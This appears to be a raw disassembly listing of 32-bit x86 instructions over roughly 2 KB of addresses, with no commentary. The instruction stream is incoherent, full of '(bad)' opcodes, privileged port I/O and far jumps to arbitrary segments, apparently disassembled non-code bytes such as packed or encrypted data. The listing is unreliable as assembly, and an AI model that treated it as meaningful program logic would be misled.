  4134d2:	mov    fs,WORD PTR [esi-0x1e]
  4134d5:	popa   
  4134d6:	pop    ds
  4134d7:	dec    ecx
  4134d8:	mov    bl,0x9
  4134da:	je     0x4134c2
  4134dc:	add    eax,0xe7f19ac0
  4134e1:	in     eax,dx
  4134e2:	bound  edi,QWORD PTR [ebx]
  4134e4:	mov    esi,ecx
  4134e6:	lods   al,BYTE PTR ds:[esi]
  4134e7:	out    0x56,al
  4134e9:	jecxz  0x4134de
  4134eb:	and    BYTE PTR [ebx],bl
  4134ed:	mov    esp,0xdeb5f24d
  4134f2:	(bad)
  4134f6:	inc    esi
  4134f7:	mov    bh,0x3a
  4134f9:	mov    ds:0xc52991fa,eax
  4134fe:	dec    ebx
  4134ff:	dec    ebp
  413500:	xchg   ecx,eax
  413501:	je     0x413487
  413503:	rcl    esp,1
  413505:	dec    esi
  413506:	mov    fs,WORD PTR [ebx+0x43294ef2]
  41350c:	inc    ecx
  41350d:	sub    eax,0xfe186010
  413512:	mov    al,ds:0x146f7f0f
  413517:	dec    esp
  413518:	sub    al,0x1d
  41351a:	push   eax
  41351b:	jg     0x41351d
  41351d:	sti    
  41351e:	inc    edi
  41351f:	test   BYTE PTR [edi+0x7b],ah
  413522:	mov    ebx,0xb4b8670b
  413527:	mov    eax,0x997435b1
  41352c:	mov    ds:0x9612537c,al
  413531:	jge    0x413538
  413533:	push   ecx
  413534:	cmp    ah,BYTE PTR [ecx-0x4647469b]
  41353a:	adc    ecx,ebp
  41353c:	push   ebp
  41353d:	mov    dl,0x7
  41353f:	push   cs
  413540:	pop    ebp
  413541:	mov    al,ds:0xee48f6a1
  413546:	fadd   QWORD PTR [ebx+esi*2-0xdca43dd]
  41354d:	push   cs
  41354e:	jl     0x413540
  413550:	jmp    0x428:0x6356ad64
  413557:	and    ebx,eax
  413559:	xchg   esi,eax
  41355a:	cmp    eax,0xffc3b8a9
  41355f:	sbb    bh,dh
  413561:	mov    gs,WORD PTR [ebx]
  413563:	push   0x4a
  413565:	inc    ebx
  413566:	ins    BYTE PTR es:[edi],dx
  413567:	lock inc edx
  413569:	bound  ebp,QWORD PTR [edx+0x1d89129e]
  41356f:	sbb    eax,0x18d44bee
  413574:	push   es
  413575:	shl    dh,1
  413577:	adc    BYTE PTR [ebp+ebx*8-0x2],al
  41357b:	dec    edx
  41357c:	or     BYTE PTR [eax],ch
  41357e:	jne    0x413513
  413580:	jl     0x413600
  413582:	not    DWORD PTR [eax-0x4999c51]
  413588:	scas   al,BYTE PTR es:[edi]
  413589:	adc    ebx,DWORD PTR [edi-0x10]
  41358c:	in     al,dx
  41358d:	pop    ebx
  41358e:	pop    es
  41358f:	int    0xf8
  413591:	mov    ebx,0x31ca32a1
  413596:	mov    cl,0xe0
  413598:	push   ecx
  413599:	push   DWORD PTR [edi]
  41359b:	mov    ebx,0xe55441
  4135a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4135a1:	fmul   DWORD PTR [edx+0x42336d63]
  4135a7:	int3   
  4135a8:	inc    ebp
  4135a9:	leave  
  4135aa:	hlt    
  4135ab:	nop
  4135ac:	add    edi,DWORD PTR [edx+0x6e]
  4135af:	xchg   ecx,eax
  4135b0:	push   ss
  4135b1:	loopne 0x41355f
  4135b3:	retf   
  4135b4:	leave  
  4135b5:	add    BYTE PTR [ecx-0x72],dh
  4135b8:	adc    eax,0xb97a8330
  4135bd:	dec    ebp
  4135be:	retf   
  4135bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4135c0:	dec    ebx
  4135c1:	adc    ah,BYTE PTR [eax-0x26]
  4135c4:	pop    es
  4135c5:	ins    DWORD PTR es:[edi],dx
  4135c6:	or     DWORD PTR [esi+0x3],edx
  4135c9:	outs   dx,DWORD PTR ds:[esi]
  4135ca:	or     eax,0x6db81444
  4135cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4135d0:	or     DWORD PTR [ebx-0x7199b52f],esi
  4135d6:	fldenv [eax+eiz*2+0x675cf3e3]
  4135dd:	retf   0xd663
  4135e0:	stc    
  4135e1:	pop    es
  4135e2:	pop    es
  4135e3:	adc    eax,0xe18959b0
  4135e8:	std    
  4135e9:	loope  0x413658
  4135eb:	sbb    eax,0x1ed79a6d
  4135f0:	fbld   TBYTE PTR [eax]
  4135f2:	push   edx
  4135f3:	sub    edx,DWORD PTR [eax-0x69]
  4135f6:	mov    edi,0x4b99471c
  4135fb:	mov    ebp,0xe0c986a8
  413600:	sbb    BYTE PTR [esi],dh
  413602:	lods   eax,DWORD PTR ds:[esi]
  413603:	out    dx,eax
  413604:	jb     0x413607
  413606:	mov    ds:0x75c4a654,eax
  41360b:	adc    ecx,ecx
  41360d:	and    eax,0x70c3a542
  413612:	out    0x32,eax
  413614:	loope  0x41361a
  413616:	mov    edx,DWORD PTR [esi-0x44]
  413619:	outs   dx,DWORD PTR ds:[esi]
  41361a:	sub    al,0xc9
  41361c:	repnz pop DWORD PTR [eax-0xfe843e8]
  413623:	clc    
  413624:	add    al,0x3d
  413626:	jns    0x4135b3
  413628:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413629:	cld    
  41362a:	adc    edi,0xc98c4f52
  413630:	add    bh,dh
  413632:	jo     0x4136a6
  413634:	lds    ecx,FWORD PTR [edx-0x50]
  413637:	xor    dl,BYTE PTR [edx-0x35e8b860]
  41363d:	test   BYTE PTR [eax-0x5301687e],0x69
  413644:	fcom   st(2)
  413646:	retf   
  413647:	out    dx,eax
  413648:	sbb    al,BYTE PTR [edx]
  41364a:	mov    esp,DWORD PTR [edi-0x33d9f1be]
  413650:	mov    BYTE PTR [ebp-0x3fbe2b1a],ch
  413656:	out    0xf8,eax
  413658:	pop    esp
  413659:	arpl   WORD PTR [esi+0x74],cx
  41365c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41365d:	or     al,0xaf
  41365f:	call   0x49c7ccd
  413664:	cmp    eax,0xbb4f9457
  413669:	ror    DWORD PTR [edi-0x6cce19b1],cl
  41366f:	lock in al,dx
  413671:	pop    edi
  413672:	inc    esi
  413673:	xlat   BYTE PTR ds:[ebx]
  413674:	js     0x4136ad
  413676:	(bad)  
  413678:	inc    edi
  413679:	nop
  41367a:	adc    DWORD PTR [ecx],eax
  41367c:	fidiv  WORD PTR es:[edi+0x15]
  413680:	add    al,0xd7
  413682:	cmp    eax,0x6daf6445
  413687:	jg     0x413679
  413689:	cmp    ecx,edx
  41368b:	pop    eax
  41368c:	ret    0x43ff
  41368f:	jmp    0x4136d5
  413691:	cmp    al,0x81
  413693:	cdq    
  413694:	add    BYTE PTR [esi+0x79],cl
  413697:	dec    edi
  413698:	sub    BYTE PTR [esi],dl
  41369a:	icebp  
  41369b:	out    0x71,eax
  41369d:	xchg   esp,eax
  41369e:	fisub  DWORD PTR ds:0xe4a870e4
  4136a4:	test   edi,edx
  4136a6:	add    BYTE PTR [eax-0x10],dl
  4136a9:	dec    eax
  4136aa:	(bad)  
  4136ac:	stc    
  4136ad:	mov    ah,0xb2
  4136af:	mov    ebx,0xf0cb50d9
  4136b4:	xlat   BYTE PTR ds:[ebx]
  4136b5:	xor    al,0x70
  4136b7:	or     eax,DWORD PTR [ecx]
  4136b9:	xchg   esp,eax
  4136ba:	push   0xf6136de
  4136bf:	test   DWORD PTR [edi],eax
  4136c1:	scas   eax,DWORD PTR es:[edi]
  4136c2:	sub    al,0x9c
  4136c4:	test   al,0x66
  4136c6:	mov    eax,DWORD PTR [eax]
  4136c8:	dec    edi
  4136c9:	and    BYTE PTR [esi-0x3],bl
  4136cc:	lods   al,BYTE PTR ds:[esi]
  4136cd:	scas   eax,DWORD PTR es:[edi]
  4136ce:	push   cs
  4136cf:	mov    al,ds:0xc6324c4c
  4136d4:	jge    0x413684
  4136d6:	lea    eax,[esi-0x48429ea5]
  4136dc:	sub    ah,BYTE PTR [ecx+0x38]
  4136df:	clc    
  4136e0:	ror    BYTE PTR [esi+0x415f7906],0x95
  4136e7:	mov    edx,0x9cd2ae91
  4136ec:	retf   0x31c7
  4136ef:	das    
  4136f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4136f1:	clc    
  4136f2:	call   0x106b:0xb24a5627
  4136f9:	imul   esi,edi,0x39
  4136fc:	ret    0xb9c0
  4136ff:	dec    esi
  413700:	call   FWORD PTR [esi-0x55]
  413703:	nop
  413704:	adc    bl,BYTE PTR [ebp-0x61a0e37b]
  41370a:	icebp  
  41370b:	xchg   esi,eax
  41370c:	and    eax,0x1c8d6367
  413711:	lahf   
  413712:	mov    eax,ds:0x53f7c702
  413717:	fld    st(7)
  413719:	mov    edx,0x523386b
  41371e:	cld    
  41371f:	fucomp st(2)
  413721:	lahf   
  413722:	repz pop esp
  413724:	call   0x832a:0xac9fb38b
  41372b:	sub    edi,esi
  41372d:	mov    ebp,0x9e7f9e54
  413732:	aad    0x18
  413734:	cmc    
  413735:	inc    esi
  413736:	mov    bl,BYTE PTR [edx-0x322b3948]
  41373c:	and    al,0x46
  41373e:	rcr    edi,cl
  413740:	add    ch,BYTE PTR ds:0xd1b2bb60
  413746:	ss repnz (bad) 
  413749:	or     al,0xed
  41374b:	push   esi
  41374c:	add    eax,0x5226d07
  413751:	imul   esp,DWORD PTR [ecx+ebp*4+0x62],0xffffffaa
  413756:	push   ebx
  413757:	push   ebp
  413758:	dec    esp
  413759:	fild   DWORD PTR [edi+eax*4-0x17]
  41375d:	cmp    DWORD PTR [ecx+edi*2-0x6d],0x80b288dc
  413765:	mov    esp,esp
  413767:	cmp    ah,0x3d
  41376a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41376b:	lods   al,BYTE PTR ds:[esi]
  41376c:	mov    bl,0x98
  41376e:	sbb    eax,0x99540c51
  413773:	jns    0x41378b
  413775:	outs   dx,BYTE PTR ds:[esi]
  413776:	js     0x4137ca
  413778:	(bad)  
  413779:	out    0x9b,al
  41377b:	pop    ecx
  41377c:	jnp    0x4137b0
  41377e:	sub    ebp,DWORD PTR [edi]
  413780:	or     BYTE PTR [edx-0x5c],ch
  413783:	or     DWORD PTR [ebp-0x7ea8d3f4],esi
  413789:	jecxz  0x4137b8
  41378b:	icebp  
  41378c:	int3   
  41378d:	push   ebx
  41378e:	lods   al,BYTE PTR ds:[esi]
  41378f:	clc    
  413790:	mov    al,0x2b
  413792:	mov    dl,0x5a
  413794:	iret   
  413795:	jo     0x413793
  413797:	lea    esp,[edx-0x675d6833]
  41379d:	test   eax,0x724fe48b
  4137a2:	adc    al,0x60
  4137a4:	xchg   ecx,eax
  4137a5:	mov    es,WORD PTR ds:0xf4a3517c
  4137ab:	adc    ebx,0x12
  4137ae:	(bad)  
  4137af:	loope  0x4137cc
  4137b1:	cli    
  4137b2:	test   DWORD PTR [esi+eiz*4-0x7a],0xd29593ec
  4137ba:	ins    DWORD PTR es:[edi],dx
  4137bb:	and    esi,DWORD PTR [ebp-0x212310fa]
  4137c1:	cmp    BYTE PTR [eax],cl
  4137c3:	jle    0x41375e
  4137c5:	mov    ah,0xdf
  4137c7:	popf   
  4137c8:	jno    0x41374e
  4137ca:	aas    
  4137cb:	pop    edx
  4137cc:	in     al,dx
  4137cd:	imul   edx,esp,0x2102f2a0
  4137d3:	jbe    0x41378c
  4137d5:	inc    eax
  4137d6:	push   es
  4137d7:	cmp    BYTE PTR [edi],0x17
  4137da:	out    0xb5,al
  4137dc:	jp     0x41375f
  4137de:	push   0xfffffff5
  4137e0:	cdq    
  4137e1:	outs   dx,BYTE PTR ds:[esi]
  4137e2:	neg    DWORD PTR ds:0x1177dd4d
  4137e8:	fwait
  4137e9:	loopne 0x4137ab
  4137eb:	mov    eax,0xfb2cfb98
  4137f0:	adc    dl,BYTE PTR [edi+edi*4-0x9]
  4137f4:	sbb    eax,0x4b56b99
  4137f9:	aas    
  4137fa:	mov    ?,WORD PTR [eax-0x42be4cf3]
  413800:	ds retf 0xe723
  413804:	jb     0x413819
  413806:	adc    esp,DWORD PTR [ebp-0x77a23c5b]
  41380c:	dec    ecx
  41380d:	in     eax,dx
  41380e:	jmp    0x41380f
  413810:	or     eax,0xd6b68677
  413815:	mov    bl,0x9a
  413817:	xor    BYTE PTR [esi-0x1e11b8a7],ah
  41381d:	pushf  
  41381e:	test   al,0xd
  413820:	daa    
  413821:	(bad)  
  413822:	fstp   st(6)
  413824:	nop
  413825:	ins    BYTE PTR es:[edi],dx
  413826:	outs   dx,BYTE PTR ds:[esi]
  413827:	jmp    0x413898
  413829:	push   0x3034410f
  41382e:	mov    eax,0x80964139
  413833:	call   0x19d2d229
  413838:	sar    DWORD PTR [ebp-0x3046ca9e],1
  41383e:	add    BYTE PTR [edx+0x2641c6b7],bl
  413844:	test   al,0xdf
  413846:	lahf   
  413847:	(bad)  
  413848:	ins    DWORD PTR es:[edi],dx
  413849:	mov    dh,0x9c
  41384b:	shl    ah,1
  41384d:	xchg   edi,eax
  41384e:	pop    edi
  41384f:	mov    ebp,0xa804429a
  413854:	cwde   
  413855:	icebp  
  413856:	jg     0x41385e
  413858:	jnp    0x41383b
  41385a:	lea    esp,[ebx+0x78a08c73]
  413860:	aam    0x44
  413862:	aad    0xdf
  413864:	jl     0x413877
  413866:	push   ds
  413867:	pop    ecx
  413868:	imul   eax,DWORD PTR [edi+0x26],0x47
  41386c:	not    DWORD PTR ds:0x928152d
  413872:	xchg   ebx,eax
  413873:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413874:	mov    esi,0xcb537799
  413879:	popa   
  41387a:	jmp    0x41384b
  41387c:	inc    DWORD PTR [edx+0x68b81d71]
  413882:	test   ah,al
  413884:	sub    al,bh
  413886:	ins    BYTE PTR es:[edi],dx
  413887:	mov    al,ds:0x68eb9bea
  41388c:	repz cmp esp,DWORD PTR gs:[eax-0x25]
  413891:	int3   
  413892:	enter  0xe471,0xc3
  413896:	cmp    al,0x31
  413898:	jne    0x4138b8
  41389a:	mov    al,ds:0x59dc0dfb
  41389f:	jae    0x413903
  4138a1:	jmp    0xa178:0x40c0f420
  4138a8:	loopne 0x41387e
  4138aa:	mov    esi,0xe8613432
  4138af:	int    0x7
  4138b1:	imul   esp,esp,0x23
  4138b4:	mov    bh,0xca
  4138b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4138b7:	stos   BYTE PTR es:[edi],al
  4138b8:	fild   QWORD PTR [esi-0x28bf42b0]
  4138be:	repz xor dl,BYTE PTR [edi-0x2e4c504e]
  4138c5:	mov    dl,0x65
  4138c7:	xchg   dx,ax
  4138c9:	mov    ds:0xc1f9a83c,eax
  4138ce:	pop    ecx
  4138cf:	mov    edi,ebp
  4138d1:	add    eax,0x80ef2ad4
  4138d6:	jno    0x413910
  4138d8:	fsub   QWORD PTR [esi+0x28f92065]
  4138de:	je     0x4138a6
  4138e0:	rol    DWORD PTR [ecx],0x1e
  4138e3:	cwde   
  4138e4:	dec    eax
  4138e5:	xor    edx,DWORD PTR [esi]
  4138e7:	pop    edi
  4138e8:	jo     0x41388f
  4138ea:	xchg   esp,eax
  4138eb:	aas    
  4138ec:	cwde   
  4138ed:	mov    ds:0xd5c8a11a,al
  4138f2:	and    cl,BYTE PTR [eax-0x60]
  4138f5:	iret   
  4138f6:	sub    DWORD PTR [esi+0x9],0xffffffe2
  4138fa:	fdivr  st(3),st
  4138fc:	sub    bl,BYTE PTR [ebp-0x2]
  4138ff:	jg     0x41394c
  413901:	mov    dh,0x6a
  413903:	lds    edx,FWORD PTR [ebp+0x12d1b855]
  413909:	adc    eax,0x9c46d159
  41390e:	std    
  41390f:	or     eax,0xa4b8e3b5
  413914:	imul   edi,DWORD PTR [edx+0x74],0x5b8b8a49
  41391b:	dec    edx
  41391c:	bound  esi,QWORD PTR [ecx-0x36568912]
  413922:	cdq    
  413923:	jecxz  0x413986
  413925:	mov    bl,0xc7
  413927:	and    al,0x75
  413929:	in     al,dx
  41392a:	inc    edx
  41392b:	rcr    BYTE PTR [ebp-0xc3a738d],1
  413931:	sti    
  413932:	mov    ds:0x469ddec6,al
  413937:	and    DWORD PTR [ecx],esi
  413939:	out    0xaf,eax
  41393b:	(bad)  
  41393c:	daa    
  41393d:	jp     0x41397a
  41393f:	mov    dl,0x39
  413941:	sub    BYTE PTR [eax],cl
  413943:	jmp    0x219cdac0
  413948:	lock in al,0x79
  41394b:	or     ch,dl
  41394d:	cwde   
  41394e:	mov    ds:0x466d3c27,eax
  413953:	lods   eax,DWORD PTR ds:[esi]
  413954:	sbb    dh,BYTE PTR [esi+0x71]
  413957:	jnp    0x41390b
  413959:	cli    
  41395a:	addr16 pop esp
  41395c:	ins    BYTE PTR es:[edi],dx
  41395d:	jbe    0x4139a6
  41395f:	adc    al,0xe0
  413961:	and    bl,BYTE PTR [edx-0x17c224e1]
  413967:	loop   0x413976
  413969:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41396a:	sbb    BYTE PTR [edx+ecx*2-0x4a],bl
  41396e:	and    DWORD PTR [ebx],0xa
  413971:	and    bl,al
  413973:	icebp  
  413974:	mov    edi,cs
  413976:	push   esp
  413977:	push   esi
  413978:	out    dx,al
  413979:	mov    ds:0x2262269e,al
  41397e:	aam    0x39
  413980:	retf   
  413981:	adc    dh,0xb6
  413984:	adc    edi,edx
  413986:	stos   BYTE PTR es:[edi],al
  413987:	cld    
  413988:	test   eax,0x161a18bd
  41398d:	shl    DWORD PTR [edi+0x593fbad6],0x99
  413994:	in     al,0x96
  413996:	aas    
  413997:	jl     0x41391e
  413999:	addr16 pop esp
  41399b:	jbe    0x4139aa
  41399d:	iret   
  41399e:	xchg   ecx,eax
  41399f:	mov    ds:0x2218ebd9,al
  4139a4:	mov    al,BYTE PTR [edx-0x3edd49d]
  4139aa:	inc    esp
  4139ab:	xor    al,cl
  4139ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139ae:	inc    esp
  4139af:	lea    ecx,[ebx-0x3e]
  4139b2:	arpl   WORD PTR [eax-0x3a5ee680],cx
  4139b8:	test   cl,ah
  4139ba:	adc    al,ch
  4139bc:	(bad)  
  4139bd:	add    DWORD PTR [ebx+0x5b],ebx
  4139c0:	xor    eax,DWORD PTR [ebx-0x1d]
  4139c3:	cmc    
  4139c4:	inc    edi
  4139c5:	cmp    eax,0xe5f97072
  4139ca:	sbb    eax,0x8f21f3fe
  4139cf:	xor    ah,0x70
  4139d2:	ins    BYTE PTR es:[edi],dx
  4139d3:	inc    edx
  4139d4:	cs mov ebx,0x9e6686e9
  4139da:	mov    cl,0x1b
  4139dc:	cmp    edi,edx
  4139de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139df:	dec    eax
  4139e0:	ja     0x4139eb
  4139e2:	xchg   ebp,eax
  4139e3:	cmp    DWORD PTR [edi-0x7fd04631],ebx
  4139e9:	sbb    DWORD PTR [ecx],ebp
  4139eb:	sti    
  4139ec:	out    dx,al
  4139ed:	inc    eax
  4139ee:	stos   BYTE PTR es:[edi],al
  4139ef:	inc    ecx
  4139f0:	shufps xmm0,XMMWORD PTR [ebp-0x1198d836],0xbd
  4139f8:	inc    ecx
  4139f9:	xlat   BYTE PTR ds:[ebx]
  4139fa:	scas   al,BYTE PTR es:[edi]
  4139fb:	and    eax,0xf23eb92f
  413a00:	imul   eax,esp,0x70a21c63
  413a06:	jmp    0x4139b6
  413a08:	aaa    
  413a09:	push   ecx
  413a0a:	sub    BYTE PTR [eax+eax*4-0x5fa5c9cf],dl
  413a11:	pop    DWORD PTR [edi+0x6c]
  413a14:	(bad)  
  413a15:	std    
  413a16:	ret    0x586d
  413a19:	push   ds
  413a1a:	mov    eax,0xa63f86a3
  413a1f:	fnstenv [ecx]
  413a21:	lods   eax,DWORD PTR ds:[esi]
  413a22:	(bad)  
  413a23:	fistp  DWORD PTR [eax]
  413a25:	pusha  
  413a26:	aam    0x14
  413a28:	and    bh,BYTE PTR [edx+0x6949c750]
  413a2e:	fidiv  DWORD PTR [ebx]
  413a30:	pop    ds
  413a31:	stos   BYTE PTR es:[edi],al
  413a32:	lods   eax,DWORD PTR ds:[esi]
  413a33:	dec    eax
  413a34:	and    DWORD PTR [edi+0x71],ecx
  413a37:	out    dx,al
  413a38:	stc    
  413a39:	loope  0x413aaf
  413a3b:	mov    eax,0xb750c671
  413a40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a41:	inc    eax
  413a42:	dec    ecx
  413a43:	sbb    DWORD PTR [edi+0x4c9400be],esi
  413a49:	xor    DWORD PTR [ebp+edx*1-0x6f18bf65],esp
  413a50:	jecxz  0x4139f3
  413a52:	add    BYTE PTR [ebp-0x28],ch
  413a55:	les    ebx,FWORD PTR [eax-0x39]
  413a58:	fild   WORD PTR [eax+0x6e]
  413a5b:	cmp    al,0xb7
  413a5d:	mov    bl,0x4c
  413a5f:	adc    DWORD PTR [edx+0x5c],esi
  413a62:	das    
  413a63:	dec    esi
  413a64:	test   al,0x9f
  413a66:	out    dx,eax
  413a67:	sbb    bl,dl
  413a69:	nop
  413a6a:	jnp    0x413a34
  413a6c:	mov    ah,0x33
  413a6e:	dec    edx
  413a6f:	sbb    BYTE PTR [ebx-0x67a749cf],ah
  413a75:	sbb    BYTE PTR [esi],0x6
  413a78:	pop    ecx
  413a79:	in     eax,0x43
  413a7b:	imul   ebp,edx,0xcdd700ac
  413a81:	add    eax,0xae7d44c4
  413a86:	xor    eax,0x7f44725d
  413a8b:	clc    
  413a8c:	out    dx,al
  413a8d:	stos   DWORD PTR es:[edi],eax
  413a8e:	adc    eax,0xb8fbfc05
  413a93:	icebp  
  413a94:	pop    esp
  413a95:	xor    eax,0x502299db
  413a9a:	jae    0x413a6a
  413a9c:	push   esi
  413a9d:	ins    DWORD PTR es:[edi],dx
  413a9e:	push   cs
  413a9f:	sahf   
  413aa0:	inc    esi
  413aa1:	mov    BYTE PTR [ecx-0x41cd503a],al
  413aa7:	(bad)  
  413aa9:	repz mov ebp,0x76d5d76d
  413aaf:	cmp    ah,ah
  413ab1:	nop
  413ab2:	bound  ebx,QWORD PTR [ebp+0x6d]
  413ab5:	jmp    FWORD PTR [ebx+0x2e5fe98]
  413abb:	and    dl,ah
  413abd:	sub    eax,0xc1e93f40
  413ac2:	(bad)  
  413ac3:	inc    ch
  413ac5:	call   0xf435:0x514bf556
  413acc:	add    eax,0x9c31a2b6
  413ad1:	or     BYTE PTR [edi-0x9e1ca04],al
  413ad7:	daa    
  413ad8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ad9:	repz mov ?,esp
  413adc:	je     0x413a8f
  413ade:	xchg   esp,eax
  413adf:	mov    ecx,0x8be3e052
  413ae4:	int3   
  413ae5:	inc    edx
  413ae6:	inc    esp
  413ae7:	sub    ecx,DWORD PTR [esi+esi*1-0x57b0032c]
  413aee:	aam    0xf0
  413af0:	cmp    BYTE PTR [ecx-0x18711e6d],dh
  413af6:	and    al,0x26
  413af8:	push   ss
  413af9:	adc    al,0x49
  413afb:	dec    ebx
  413afc:	and    al,0xc1
  413afe:	sar    BYTE PTR [eax+edx*4+0x6f],1
  413b02:	add    eax,0x7a409d1c
  413b07:	push   ebp
  413b08:	iret   
  413b09:	(bad)  
  413b0a:	mov    cl,0x37
  413b0c:	gs loope 0x413ac3
  413b0f:	adc    bl,bl
  413b11:	test   eax,0x549eb106
  413b16:	sti    
  413b17:	mov    WORD PTR [eax],ds
  413b19:	xchg   ecx,eax
  413b1a:	adc    ecx,edx
  413b1c:	stc    
  413b1d:	rol    BYTE PTR [ebp-0x58b4bfe],cl
  413b23:	pop    ds
  413b24:	mov    ss,WORD PTR [ecx-0x72]
  413b27:	mov    bl,0xcb
  413b29:	cmp    DWORD PTR [ecx],esp
  413b2b:	rcr    BYTE PTR ds:0xf94eedb,1
  413b31:	sbb    BYTE PTR [ecx],0xe1
  413b34:	sbb    edx,DWORD PTR [ebp+0x71]
  413b37:	loope  0x413b8e
  413b39:	stc    
  413b3a:	xchg   edi,eax
  413b3b:	cmp    esp,edi
  413b3d:	stc    
  413b3e:	nop
  413b3f:	loopne 0x413b01
  413b41:	(bad)  
  413b42:	cli    
  413b43:	into   
  413b44:	out    dx,eax
  413b45:	lods   eax,DWORD PTR ds:[esi]
  413b46:	pop    ebx
  413b47:	or     ecx,ebx
  413b49:	lock jnp 0x413ba4
  413b4c:	mov    BYTE PTR [edi+eiz*2-0x44],al
  413b50:	mov    ds:0xdc0cef75,eax
  413b55:	out    0x19,al
  413b57:	jns    0x413bb9
  413b59:	pushf  
  413b5a:	and    eax,0xaf72ad2f
  413b5f:	or     al,bh
  413b61:	adc    eax,0x59eca510
  413b66:	mov    ds:0xf72ad449,al
  413b6b:	arpl   WORD PTR [edx+ebp*8+0x2a],bp
  413b6f:	pop    ebx
  413b70:	and    BYTE PTR [esi-0x75ece5d1],0xa4
  413b77:	sub    DWORD PTR [edi-0x3cd0b6bb],ecx
  413b7d:	jp     0x413bcc
  413b7f:	cmp    al,0xe1
  413b81:	mov    cs,WORD PTR [bp+di+0xc]
  413b85:	ret    
  413b86:	retf   
  413b87:	cmp    eax,0x92a7c1c
  413b8c:	push   ebx
  413b8d:	and    dh,BYTE PTR [edi]
  413b8f:	pop    esp
  413b90:	or     DWORD PTR [eax+0x12],0x70c389ed
  413b97:	cli    
  413b98:	jecxz  0x413bc3
  413b9a:	pop    esi
  413b9b:	popa   
  413b9c:	shl    DWORD PTR [edi],1
  413b9e:	xchg   esi,eax
  413b9f:	(bad)  
  413ba0:	sbb    al,0x44
  413ba2:	or     BYTE PTR [ebx],0xf6
  413ba5:	jnp    0x413b30
  413ba7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ba8:	repnz imul eax,ecx,0xdf24f926
  413baf:	pop    ds
  413bb0:	push   esp
  413bb1:	lods   al,BYTE PTR ds:[esi]
  413bb2:	push   esi
  413bb3:	pusha  
  413bb4:	mov    edi,0xe2b5fd2a
  413bb9:	mov    ss,ebp
  413bbb:	aad    0xda
  413bbd:	(bad)  
  413bbe:	hlt    
  413bbf:	mov    edi,0xd3a32407
  413bc4:	xchg   DWORD PTR [ebx-0x80],edi
  413bc7:	loope  0x413b55
  413bc9:	pusha  
  413bca:	into   
  413bcb:	shl    DWORD PTR fs:[eax*2+0x258e316c],1
  413bd3:	ins    BYTE PTR es:[edi],dx
  413bd4:	mov    ds:0x73df95b1,eax
  413bd9:	xchg   esi,eax
  413bda:	call   0x86407029
  413bdf:	add    DWORD PTR [eax],ebx
  413be1:	push   ecx
  413be2:	jmp    0x413b84
  413be4:	and    bh,ch
  413be6:	pop    es
  413be7:	std    
  413be8:	lods   al,BYTE PTR ds:[esi]
  413be9:	mov    esi,0x5a66604
  413bee:	test   BYTE PTR [esi],bh
  413bf0:	mov    ebx,0x15720389
  413bf5:	(bad)  [eax+0x35]
  413bf8:	aaa    
  413bf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413bfa:	cli    
  413bfb:	cmp    al,0x2a
  413bfd:	pop    esp
  413bfe:	lods   eax,DWORD PTR ds:[esi]
  413bff:	loope  0x413c61
  413c01:	mov    esi,0x25dfc11f
  413c06:	and    eax,0x3d949cf9
  413c0b:	dec    esi
  413c0c:	inc    BYTE PTR [ebp+0x68d4db19]
  413c12:	iret   
  413c13:	sub    eax,0xfbacfac5
  413c18:	jo     0x413c65
  413c1a:	addr16 ds jno 0x413bad
  413c1e:	mov    edx,0x5365ca48
  413c23:	ret    
  413c24:	pop    esp
  413c25:	jmp    0x413c57
  413c27:	mov    al,ds:0xab2a90e
  413c2c:	es adc al,0xe7
  413c2f:	mov    ebx,esp
  413c31:	nop
  413c32:	leave  
  413c33:	fwait
  413c34:	popa   
  413c35:	aas    
  413c36:	xchg   ecx,eax
  413c37:	rol    DWORD PTR [ebp+ebx*1+0x48e89803],cl
  413c3e:	aaa    
  413c3f:	int    0x8a
  413c41:	rcr    dl,cl
  413c43:	adc    al,0x16
  413c45:	or     eax,0xf4b0c7d0
  413c4a:	inc    ebp
  413c4b:	xchg   edx,eax
  413c4c:	ins    BYTE PTR es:[edi],dx
  413c4d:	mov    esi,0x8b9600de
  413c52:	cmp    al,0x76
  413c54:	mov    ebp,0xa10c972d
  413c59:	je     0x413c5d
  413c5b:	std    
  413c5c:	fisubr WORD PTR [ebp-0x3726eff9]
  413c62:	push   eax
  413c63:	cmp    esp,DWORD PTR [ecx+0xa8a6171]
  413c69:	ret    
  413c6a:	cmp    DWORD PTR [eax+ebx*2-0x2f],0x21
  413c6f:	xor    bh,BYTE PTR [esi+edx*1+0x24f7c6a]
  413c76:	es dec edx
  413c78:	mov    ah,0x41
  413c7a:	jmp    0xe85b:0xc61940f
  413c81:	cdq    
  413c82:	add    BYTE PTR [ecx+0x3f],bl
  413c85:	(bad)  
  413c86:	mov    bh,0x6e
  413c88:	mov    al,bl
  413c8a:	pop    esi
  413c8b:	out    dx,eax
  413c8c:	fst    DWORD PTR [edi-0x53f4881f]
  413c92:	lahf   
  413c93:	cdq    
  413c94:	retf   
  413c95:	sbb    eax,0xb9330bf
  413c9a:	out    dx,al
  413c9b:	push   ebp
  413c9c:	clc    
  413c9d:	dec    esi
  413c9e:	imul   ebp,DWORD PTR [eax],0x19d7091e
  413ca4:	mov    ah,0x1c
  413ca6:	hlt    
  413ca7:	stos   DWORD PTR es:[edi],eax
  413ca8:	add    al,0x85
  413caa:	push   edi
  413cab:	or     esi,DWORD PTR [edx+0x2893bbd6]
  413cb1:	xchg   dh,bh
  413cb3:	test   eax,0xe0c928c9
  413cb8:	mov    al,0x35
  413cba:	sub    eax,0x277b3396
  413cbf:	je     0x413d20
